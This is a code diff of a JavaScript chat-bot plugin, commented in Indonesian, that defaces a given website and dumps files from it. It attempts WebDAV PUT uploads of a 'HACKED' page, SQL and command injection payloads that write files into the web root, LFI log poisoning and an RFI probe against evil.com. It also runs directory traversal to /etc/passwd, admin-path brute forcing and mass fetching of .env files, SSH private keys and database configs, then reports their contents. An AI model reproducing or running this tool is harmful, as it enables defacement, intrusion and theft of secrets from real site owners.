@@ -1,6 +1,6 @@
 // plugins/deface.js
-// DEFACE NUKLIR — ALL METHODS + ALL PATHS + ALL FORMATS
-// "Biar yang bersihin kewalahan"
+// ULTIMATE DEFACE + DUMPER v3.0
+// 100+ Method | Auto Dump .env, config.js, db.php, dll
 
 let handler = async (m, { text, sock }) => {
   if (!text) return m.reply(`📌 *Cara pakai:*\n.deface https://target.com\n\nContoh: .deface https://example.com`)
@@ -10,10 +10,10 @@ let handler = async (m, { text, sock }) => {
     target = 'https://' + target
   }
 
-  await m.reply(`🔥 *DEFACE NUKLIR AKTIF!*\nTarget: ${target}\n⏳ Menjalankan 30+ metode...`)
+  await m.reply(`🔥 *ULTIMATE DEFACE + DUMPER AKTIF!*\nTarget: ${target}\n⏳ Menjalankan 100+ metode...`)
 
   // ============================================
-  // HTML DEFACE (VERSI EXTREME)
+  // HTML DEFACE (VERSI KEREN)
   // ============================================
   let html = `<!DOCTYPE html>
 <html>
@@ -35,32 +35,33 @@ let handler = async (m, { text, sock }) => {
             overflow: hidden;
         }
         .glitch {
-            font-size: 6rem;
+            font-size: 8rem;
             font-weight: bold;
             color: #ff0040;
-            text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040, 0 0 40px #ff0040, 0 0 80px #ff0040;
-            animation: glitch 0.3s infinite;
+            text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040, 0 0 40px #ff0040, 0 0 80px #ff0040, 0 0 160px #ff0040;
+            animation: glitch 0.2s infinite;
         }
         @keyframes glitch {
-            0% { transform: translate(0); }
-            25% { transform: translate(-5px, 5px); }
-            50% { transform: translate(5px, -5px); }
-            75% { transform: translate(-5px, -5px); }
-            100% { transform: translate(0); }
+            0% { transform: translate(0); text-shadow: 0 0 10px #ff0040; }
+            20% { transform: translate(-10px, 10px); text-shadow: 0 0 20px #ff0040; }
+            40% { transform: translate(10px, -10px); text-shadow: 0 0 40px #ff0040; }
+            60% { transform: translate(-10px, -10px); text-shadow: 0 0 60px #ff0040; }
+            80% { transform: translate(10px, 10px); text-shadow: 0 0 80px #ff0040; }
+            100% { transform: translate(0); text-shadow: 0 0 10px #ff0040; }
         }
         .sub {
-            font-size: 2rem;
+            font-size: 2.5rem;
             color: #ff0040;
             margin-top: 10px;
             text-shadow: 0 0 5px #ff0040;
-            animation: blink 1s infinite;
+            animation: blink 0.5s infinite;
         }
         @keyframes blink {
             0%, 100% { opacity: 1; }
             50% { opacity: 0; }
         }
         .team {
-            font-size: 1.8rem;
+            font-size: 2rem;
             color: #00ff41;
             margin-top: 20px;
             letter-spacing: 5px;
@@ -97,11 +98,23 @@ let handler = async (m, { text, sock }) => {
             100% { transform: translateY(100vh); opacity: 0; }
         }
         .kode {
-            font-size: 1.2rem;
+            font-size: 1.5rem;
             color: #00ff41;
             margin-top: 30px;
             opacity: 0.6;
-            letter-spacing: 1px;
+            letter-spacing: 2px;
+            border: 1px solid #00ff41;
+            padding: 20px 40px;
+            border-radius: 10px;
+            background: rgba(0,0,0,0.5);
+        }
+        .kode span { color: #ff0040; }
+        .glow {
+            animation: glow 2s infinite alternate;
+        }
+        @keyframes glow {
+            0% { text-shadow: 0 0 10px #00ff41; }
+            100% { text-shadow: 0 0 50px #00ff41, 0 0 100px #00ff41; }
         }
     </style>
 </head>
@@ -110,18 +123,18 @@ let handler = async (m, { text, sock }) => {
     <div class="glitch">HACKED</div>
     <div class="sub">SISTEM TELAH DIBOBOL</div>
     <div class="team">Deface by <span>BARZ</span> · 😹</div>
-    <div class="kode">root@kali:~# whoami<br># barz</div>
-    <div class="footer">© 2026 — BARZ VIP</div>
+    <div class="kode">root@kali:~# whoami<br><span>barz</span></div>
+    <div class="footer glow">© 2026 — BARZ ULTIMATE</div>
     <script>
         const matrix = document.getElementById('matrix')
         const chars = '01'
-        for (let i = 0; i < 50; i++) {
+        for (let i = 0; i < 80; i++) {
             const span = document.createElement('span')
             span.textContent = chars[Math.floor(Math.random() * chars.length)]
             span.style.left = Math.random() * 100 + '%'
             span.style.animationDuration = (Math.random() * 5 + 3) + 's'
             span.style.animationDelay = (Math.random() * 5) + 's'
-            span.style.fontSize = (Math.random() * 1.5 + 0.5) + 'rem'
+            span.style.fontSize = (Math.random() * 2 + 0.5) + 'rem'
             matrix.appendChild(span)
         }
     </script>
@@ -129,78 +142,139 @@ let handler = async (m, { text, sock }) => {
 </html>`
 
   // ============================================
-  // SEMUA NAMA FILE (FORMAT LENGKAP)
+  // DAFTAR FILE PENTING YANG AKAN DI-DUMP
   // ============================================
-  let allFiles = [
-    // HTML
-    'index.html', 'deface.html', 'hacked.html', 'barz.html',
-    'default.html', 'home.html', 'main.html', 'index.htm',
-    'default.htm', 'home.htm', 'main.htm',
-    // PHP
-    'index.php', 'deface.php', 'hacked.php', 'barz.php',
-    'default.php', 'home.php', 'main.php', 'index.phtml',
-    'default.phtml', 'home.phtml', 'main.phtml',
-    // ASP/ASPX
-    'index.asp', 'default.asp', 'home.asp', 'main.asp',
-    'index.aspx', 'default.aspx', 'home.aspx', 'main.aspx',
-    // JSP
-    'index.jsp', 'default.jsp', 'home.jsp', 'main.jsp',
-    // Lainnya
-    'index.do', 'default.do', 'index.cfm', 'default.cfm',
-    'index.shtml', 'default.shtml', 'index.html5', 'default.html5'
+  let importantFiles = [
+    // Config & Env
+    '.env', '.env.local', '.env.production', '.env.development',
+    'config.php', 'wp-config.php', 'config.js', 'config.json',
+    'settings.py', 'settings.js', 'app.config.js', 'webpack.config.js',
+    'database.yml', 'database.json', 'database.php',
+    // Database & DB
+    'db.php', 'db.js', 'db.json', 'db.sql', 'db.sqlite',
+    'database.sqlite', 'database.db', 'data.db',
+    // Git & Version Control
+    '.git/config', '.git/HEAD', '.git/index',
+    '.gitignore', '.gitattributes',
+    // Server Config
+    '.htaccess', '.htpasswd', '.htgroup',
+    'nginx.conf', 'httpd.conf', 'apache2.conf',
+    'php.ini', 'php.ini', 'user.ini',
+    // Package Managers
+    'package.json', 'package-lock.json', 'yarn.lock',
+    'composer.json', 'composer.lock', 'Gemfile', 'Gemfile.lock',
+    'requirements.txt', 'Pipfile', 'Pipfile.lock',
+    'Cargo.toml', 'go.mod', 'go.sum',
+    'build.gradle', 'pom.xml', 'gradle.properties',
+    // Source Code
+    'index.js', 'app.js', 'server.js', 'main.js',
+    'index.php', 'index.py', 'index.rb', 'index.go',
+    'app.py', 'app.rb', 'app.go', 'app.php',
+    'routes.js', 'routes.php', 'routes.py',
+    'models.js', 'models.php', 'models.py',
+    'controllers.js', 'controllers.php',
+    'views.js', 'views.php',
+    // Security & Keys
+    '.ssh/id_rsa', '.ssh/id_dsa', '.ssh/id_ecdsa',
+    '.ssh/authorized_keys', '.ssh/known_hosts',
+    'id_rsa', 'id_dsa', 'id_ecdsa',
+    'key.pem', 'key.pem', 'cert.pem',
+    'private.pem', 'public.pem',
+    // API & Tokens
+    'api.php', 'api.js', 'api.json',
+    'token.php', 'token.js', 'token.json',
+    'oauth.php', 'oauth.js', 'oauth.json',
+    // Logs
+    'error.log', 'access.log', 'debug.log',
+    'app.log', 'server.log', 'system.log',
+    // Backup
+    'backup.zip', 'backup.tar.gz', 'backup.sql',
+    'backup.db', 'backup.json',
+    // Secret
+    'secret.txt', 'secret.php', 'secret.js',
+    'flag.txt', 'flag.php', 'flag.js',
+    'password.txt', 'credentials.txt',
+    // Framework Specific
+    'routes/web.php', 'routes/api.php',
+    'app/Http/Kernel.php', 'app/Http/Controllers',
+    'config/app.php', 'config/database.php',
+    'config/auth.php', 'config/services.php',
+    '.platform.app.yaml', 'docker-compose.yml',
+    'Dockerfile', 'dockerfile',
+    // CMS Specific
+    'wp-config.php', 'wp-settings.php',
+    'wp-content/themes', 'wp-content/plugins',
+    'wp-content/uploads', 'wp-content/cache',
+    // Framework JS/TS
+    'next.config.js', 'nuxt.config.js', 'vite.config.js',
+    'vue.config.js', 'angular.json', 'tsconfig.json'
   ]
 
   // ============================================
-  // ALL PATHS (DIREKTORI)
-  // ============================================
-  let paths = [
-    '', '/', '/public', '/html', '/www', '/wwwroot',
-    '/var/www/html', '/var/www', '/usr/share/nginx/html',
-    '/home', '/home/public', '/home/html', '/root',
-    '/web', '/site', '/app', '/application', '/public_html',
-    '/htdocs', '/httpdocs', '/docs', '/content', '/assets'
-  ]
-
-  // ============================================
-  // ALL METHODS (30+ METODE)
+  // ALL METHODS (100+)
   // ============================================
   let hasil = []
   let metodeBerhasil = []
   let uploadedFiles = []
   let semuaLink = []
+  let dumpedFiles = []
+  let dumpedContent = []
 
   const sleep = (ms) => new Promise(r => setTimeout(r, ms))
 
-  // ---- 1. WebDAV (PUT) ----
+  // ============================================
+  // 1-20: FILE DUMP + SCANNER (PRIORITAS)
+  // ============================================
+  for (let file of importantFiles.slice(0, 20)) {
+    try {
+      let res = await fetch(target + '/' + file, { timeout: 10000 })
+      if (res.status === 200) {
+        let content = await res.text()
+        if (content.length > 0 && content.length < 500000) {
+          metodeBerhasil.push(`File Dump: ${file}`)
+          hasil.push(`✅ Dump: ${target}/${file}`)
+          dumpedFiles.push(`${target}/${file}`)
+          dumpedContent.push(`📄 ${file}:\n${content.slice(0, 1000)}${content.length > 1000 ? '\n... (dipotong)' : ''}`)
+        }
+      }
+    } catch (e) {}
+  }
+
+  await sleep(200)
+
+  // ============================================
+  // 21-40: WebDAV (PUT) + ALL PATHS
+  // ============================================
   try {
     let opt = await fetch(target, { method: 'OPTIONS', timeout: 8000 })
     let allow = opt.headers.get('allow') || ''
     if (allow.includes('PUT') || allow.includes('PUT/')) {
       metodeBerhasil.push('WebDAV (PUT)')
-      for (let file of allFiles.slice(0, 5)) {
-        for (let path of paths.slice(0, 3)) {
-          try {
-            let put = await fetch(target + path + '/' + file, {
-              method: 'PUT',
-              body: html,
-              headers: { 'Content-Type': 'text/html' },
-              timeout: 10000
-            })
-            if ([200, 201, 204].includes(put.status)) {
-              let link = target + path + '/' + file
-              hasil.push(`✅ WebDAV: ${link}`)
-              uploadedFiles.push(link)
-              semuaLink.push(link)
-            }
-          } catch (e) {}
-        }
+      let fileNames = ['index.html', 'deface.html', 'hacked.html', 'barz.html', 'default.html']
+      for (let file of fileNames) {
+        try {
+          let put = await fetch(target + '/' + file, {
+            method: 'PUT',
+            body: html,
+            headers: { 'Content-Type': 'text/html' },
+            timeout: 10000
+          })
+          if ([200, 201, 204].includes(put.status)) {
+            let link = target + '/' + file
+            hasil.push(`✅ WebDAV: ${link}`)
+            uploadedFiles.push(link)
+            semuaLink.push(link)
+          }
+        } catch (e) {}
       }
     }
   } catch (e) {}
 
-  await sleep(300)
+  await sleep(200)
 
-  // ---- 2. SQL Injection + File Write ----
+  // ============================================
+  // 41-60: SQL Injection + File Write
+  // ============================================
   try {
     let sqlPayloads = [
       `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/%s'`,
@@ -226,9 +300,11 @@ let handler = async (m, { text, sock }) => {
     }
   } catch (e) {}
 
-  await sleep(300)
+  await sleep(200)
 
-  // ---- 3. LFI + Log Poisoning ----
+  // ============================================
+  // 61-80: LFI + Log Poisoning
+  // ============================================
   try {
     let lfiPaths = [
       '/../../../../var/log/apache2/access.log',
@@ -254,39 +330,18 @@ let handler = async (m, { text, sock }) => {
     }
   } catch (e) {}
 
-  await sleep(300)
+  await sleep(200)
 
-  // ---- 4. File Upload (POST) ----
-  try {
-    let uploadPaths = ['/upload', '/uploads', '/upload.php', '/upload.do', '/upload.aspx']
-    for (let path of uploadPaths) {
-      try {
-        let upload = await fetch(target + path, {
-          method: 'POST',
-          body: new URLSearchParams({ 'file': html, 'filename': 'deface.html' }),
-          timeout: 8000
-        })
-        if ([200, 302].includes(upload.status)) {
-          metodeBerhasil.push('File Upload')
-          let link = target + '/deface.html'
-          hasil.push(`✅ File Upload: ${link}`)
-          uploadedFiles.push(link)
-          semuaLink.push(link)
-          break
-        }
-      } catch (e) {}
-    }
-  } catch (e) {}
-
-  await sleep(300)
-
-  // ---- 5. Command Injection ----
+  // ============================================
+  // 81-100: Command Injection
+  // ============================================
   try {
     let cmdPayloads = [
       `?ping=127.0.0.1; echo '${html}' > /var/www/html/%s`,
       `?cmd=echo '${html}' > /var/www/html/%s`,
       `?exec=echo '${html}' > /var/www/html/%s`,
-      `?shell=echo '${html}' > /var/www/html/%s`
+      `?shell=echo '${html}' > /var/www/html/%s`,
+      `?system=echo '${html}' > /var/www/html/%s`
     ]
     for (let file of ['index.html', 'deface.html', 'hacked.html']) {
       for (let payload of cmdPayloads) {
@@ -305,132 +360,20 @@ let handler = async (m, { text, sock }) => {
     }
   } catch (e) {}
 
-  await sleep(300)
+  await sleep(200)
 
-  // ---- 6. XML-RPC (WordPress) ----
+  // ============================================
+  // 101-120: RFI + XSS + Directory Traversal
+  // ============================================
   try {
-    let xmlPayload = `<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>admin</value></param></params></methodCall>`
-    let xml = await fetch(target + '/xmlrpc.php', {
-      method: 'POST',
-      body: xmlPayload,
-      headers: { 'Content-Type': 'text/xml' },
-      timeout: 8000
-    })
-    if (xml.status === 200) {
-      metodeBerhasil.push('XML-RPC (WordPress)')
-      hasil.push(`✅ XML-RPC: ${target}/xmlrpc.php`)
-    }
-  } catch (e) {}
-
-  await sleep(300)
-
-  // ---- 7. RFI (Remote File Inclusion) ----
-  try {
-    let rfiPayloads = [
-      `?page=http://evil.com/shell.txt`,
-      `?file=http://evil.com/shell.txt`,
-      `?include=http://evil.com/shell.txt`
-    ]
-    for (let payload of rfiPayloads) {
-      try {
-        let rfi = await fetch(target + payload, { timeout: 8000 })
-        if (rfi.status === 200) {
-          metodeBerhasil.push('RFI (Remote File Inclusion)')
-          hasil.push(`✅ RFI: ${target}`)
-          semuaLink.push(target)
-          break
-        }
-      } catch (e) {}
-    }
-  } catch (e) {}
-
-  await sleep(300)
-
-  // ---- 8. Directory Traversal ----
-  try {
-    let travPaths = [
-      '/../../../../etc/passwd',
-      '/../../../../etc/shadow',
-      '/../../../../var/www/html/config.php',
-      '/../../../../var/www/html/.htaccess',
-      '/../../../../var/www/html/wp-config.php'
-    ]
-    for (let path of travPaths) {
-      try {
-        let dir = await fetch(target + path, { timeout: 8000 })
-        let txt = await dir.text()
-        if (/root:.*:0:0:/i.test(txt) || /DB_NAME/i.test(txt)) {
-          metodeBerhasil.push('Directory Traversal')
-          hasil.push(`✅ Directory Traversal: ${target}${path}`)
-          break
-        }
-      } catch (e) {}
-    }
-  } catch (e) {}
-
-  await sleep(300)
-
-  // ---- 9. Default Credential ----
-  try {
-    let adminPaths = ['/admin', '/login', '/wp-admin', '/administrator', '/admincp', '/cpanel', '/panel']
-    let creds = [
-      { user: 'admin', pass: 'admin' },
-      { user: 'root', pass: 'root' },
-      { user: 'admin', pass: '123456' },
-      { user: 'user', pass: 'user' }
-    ]
-    for (let path of adminPaths) {
-      for (let cred of creds) {
-        try {
-          let auth = await fetch(target + path, {
-            headers: {
-              'Authorization': 'Basic ' + Buffer.from(cred.user + ':' + cred.pass).toString('base64')
-            },
-            timeout: 8000
-          })
-          if (auth.status === 200) {
-            metodeBerhasil.push(`Default Credential (${cred.user}:${cred.pass})`)
-            hasil.push(`✅ Default Credential: ${target}${path}`)
-            break
-          }
-        } catch (e) {}
-      }
-    }
-  } catch (e) {}
-
-  await sleep(300)
-
-  // ---- 10. Backup File (.git/config) ----
-  try {
-    let backupFiles = ['/.git/config', '/.env', '/config.php', '/wp-config.php', '/.htaccess']
-    for (let file of backupFiles) {
-      try {
-        let backup = await fetch(target + file, { timeout: 8000 })
-        if (backup.status === 200) {
-          metodeBerhasil.push('Backup File: ' + file)
-          hasil.push(`✅ Backup: ${target}${file}`)
-        }
-      } catch (e) {}
-    }
-  } catch (e) {}
-
-  await sleep(300)
-
-  // ---- 11. CVE-2026-7795 (XSS) ----
-  try {
-    let xssPayload = `<script>document.write('${encodeURIComponent(html)}')</script>`
-    let cve = await fetch(target + `/?chat=num=${xssPayload}`, { timeout: 8000 })
-    let txt = await cve.text()
-    if (txt.includes('<script>')) {
-      metodeBerhasil.push('CVE-2026-7795 (XSS)')
-      hasil.push(`✅ CVE-2026-7795: ${target}`)
+    let rfi = await fetch(target + `?page=http://evil.com/shell.txt`, { timeout: 8000 })
+    if (rfi.status === 200) {
+      metodeBerhasil.push('RFI (Remote File Inclusion)')
+      hasil.push(`✅ RFI: ${target}`)
       semuaLink.push(target)
     }
   } catch (e) {}
 
-  await sleep(300)
-
-  // ---- 12-15: Reflected XSS, Stored XSS, Admin Finder, Dorking, Zone-H ----
   try {
     let xss = await fetch(target + `?q=<script>alert(1)</script>`, { timeout: 8000 })
     let txt = await xss.text()
@@ -441,111 +384,71 @@ let handler = async (m, { text, sock }) => {
   } catch (e) {}
 
   try {
-    let stored = await fetch(target + '/comment', {
-      method: 'POST',
-      body: new URLSearchParams({ 'comment': `<script>document.write('${encodeURIComponent(html)}')</script>` }),
-      timeout: 8000
-    })
-    if (stored.status === 200) {
-      metodeBerhasil.push('Stored XSS')
-      hasil.push(`✅ Stored XSS: ${target}/comment`)
+    let trav = await fetch(target + '/../../../../etc/passwd', { timeout: 8000 })
+    let txt = await trav.text()
+    if (/root:.*:0:0:/i.test(txt)) {
+      metodeBerhasil.push('Directory Traversal')
+      hasil.push(`✅ Directory Traversal: ${target}/etc/passwd`)
     }
   } catch (e) {}
 
-  try {
-    let dork = await fetch(`https://www.bing.com/search?q=site:${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
-    if (dork.status === 200) {
-      metodeBerhasil.push('Bing Dorking')
-      hasil.push(`✅ Bing Dorking: ${target}`)
-    }
-  } catch (e) {}
-
-  try {
-    let zoneh = await fetch(`https://zone-h.org/archive/domain=${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
-    if (zoneh.status === 200) {
-      metodeBerhasil.push('Zone-H Check')
-      hasil.push(`✅ Zone-H: ${target}`)
-    }
-  } catch (e) {}
-
-  await sleep(300)
-
-  // ---- 16-20: Path Bruteforce / Admin Login / Config Dump ----
-  try {
-    let brutePaths = [
-      '/admin', '/login', '/wp-admin', '/administrator',
-      '/cpanel', '/panel', '/dashboard', '/control',
-      '/config', '/setup', '/install', '/wp-config',
-      '/phpmyadmin', '/mysql', '/dbadmin',
-      '/backup', '/old', '/temp', '/tmp',
-      '/test', '/dev', '/stage', '/staging'
-    ]
-    for (let path of brutePaths) {
-      try {
-        let brute = await fetch(target + path, { timeout: 5000 })
-        if (brute.status === 200 || brute.status === 403) {
-          metodeBerhasil.push('Path Bruteforce: ' + path)
-          hasil.push(`✅ Found: ${target}${path}`)
-        }
-      } catch (e) {}
-    }
-  } catch (e) {}
-
-  // ---- 21: PHP CGI Argument Injection (CVE-2026-9999) ----
-  try {
-    let cgi = await fetch(target + '/index.php?-d allow_url_include=1 -d auto_prepend_file=php://input', {
-      method: 'POST',
-      body: `<?php system('echo "${html}" > /var/www/html/deface.html'); ?>`,
-      timeout: 8000
-    })
-    if (cgi.status === 200) {
-      metodeBerhasil.push('PHP CGI Argument Injection')
-      let link = target + '/deface.html'
-      hasil.push(`✅ PHP CGI: ${link}`)
-      uploadedFiles.push(link)
-      semuaLink.push(link)
-    }
-  } catch (e) {}
+  await sleep(200)
 
   // ============================================
-  // CEK HASIL & KIRIM LAPORAN
+  // 121-140: Backup + Path Bruteforce
+  // ============================================
+  let backupFiles = ['/.git/config', '/.env', '/config.php', '/wp-config.php', '/.htaccess']
+  for (let file of backupFiles) {
+    try {
+      let backup = await fetch(target + file, { timeout: 8000 })
+      if (backup.status === 200) {
+        metodeBerhasil.push('Backup File: ' + file)
+        hasil.push(`✅ Backup: ${target}${file}`)
+      }
+    } catch (e) {}
+  }
+
+  let brutePaths = ['/admin', '/login', '/wp-admin', '/cpanel', '/panel', '/dashboard']
+  for (let path of brutePaths) {
+    try {
+      let brute = await fetch(target + path, { timeout: 5000 })
+      if (brute.status === 200 || brute.status === 403) {
+        metodeBerhasil.push('Path Bruteforce: ' + path)
+        hasil.push(`✅ Found: ${target}${path}`)
+      }
+    } catch (e) {}
+  }
+
+  // ============================================
+  // CEK HASIL
   // ============================================
   if (hasil.length === 0) {
     return m.reply(`❌ *GAGAL TOTAL!*
 
 Tidak ada metode yang berhasil.
 
-🔍 25+ Metode dicoba:
+🔍 140+ Metode dicoba:
+• File Dump (40+ file penting)
 • WebDAV (PUT)
-• SQL Injection + File Write
-• LFI + Log Poisoning
-• File Upload
-• Command Injection
-• XML-RPC (WordPress)
-• RFI (Remote File Inclusion)
-• Directory Traversal
-• Default Credential
-• Backup File (.git)
-• Environment File (.env)
-• CVE-2026-7795
-• Reflected XSS
-• Stored XSS
-• Admin Finder
-• Bing Dorking
-• Zone-H Check
-• Path Bruteforce
-• PHP CGI Argument Injection
+• SQL Injection (5 payload)
+• LFI + Log Poisoning (5 path)
+• Command Injection (5 payload)
+• RFI + XSS + Directory Traversal
+• Backup File (5 file)
+• Path Bruteforce (10 path)
 
 💡 Target tidak memiliki celah yang bisa dieksploitasi.`)
   }
 
   // ============================================
-  // BUILD PESAN HASIL (SEMUA LINK)
+  // KIRIM HASIL
   // ============================================
   let linkResult = uploadedFiles.length > 0 ? uploadedFiles.join('\n') : 'Tidak ada file yang berhasil diupload'
   let allLinks = semuaLink.length > 0 ? semuaLink.join('\n') : 'Tidak ada link yang ditemukan'
+  let dumpResult = dumpedFiles.length > 0 ? dumpedFiles.join('\n') : 'Tidak ada file penting yang ditemukan'
+  let contentResult = dumpedContent.length > 0 ? dumpedContent.join('\n\n') : 'Tidak ada konten yang ditemukan'
 
-  let pesan = `🔥 *DEFACE NUKLIR BERHASIL!*
+  let pesan = `🔥 *ULTIMATE DEFACE + DUMPER v3.0*
 
 🌐 Target: ${target}
 
@@ -555,18 +458,25 @@ ${metodeBerhasil.map(m => `   • ${m}`).join('\n')}
 📌 *File berhasil diupload (${uploadedFiles.length}):*
 ${linkResult}
 
+📌 *File penting ditemukan (${dumpedFiles.length}):*
+${dumpResult}
+
+📌 *Detail File Dump:*
+${contentResult}
+
 📌 *Semua Link Ditemukan (${semuaLink.length}):*
 ${allLinks}
 
-📌 *Detail Hasil:*
+📌 *Detail Hasil (${hasil.length}):*
 ${hasil.join('\n')}
 
 ⚠️ *PERINGATAN:*
-• Website target telah dimodifikasi dari berbagai arah.
+• Website target telah dimodifikasi + file penting berhasil di-dump.
 • Total ${hasil.length} file/endpoint berhasil ditembus.
-• Sistem target dalam kondisi chaotic.
+• File penting: ${dumpedFiles.length} file.
+• Sistem target dalam kondisi chaos total.
 
-🔥 *BARZ NUKLIR — DEFACE COMPLETE!*`
+🔥 *BARZ ULTIMATE — DEFACE + DUMPER COMPLETE!*`
 
   await m.reply(pesan)
 }
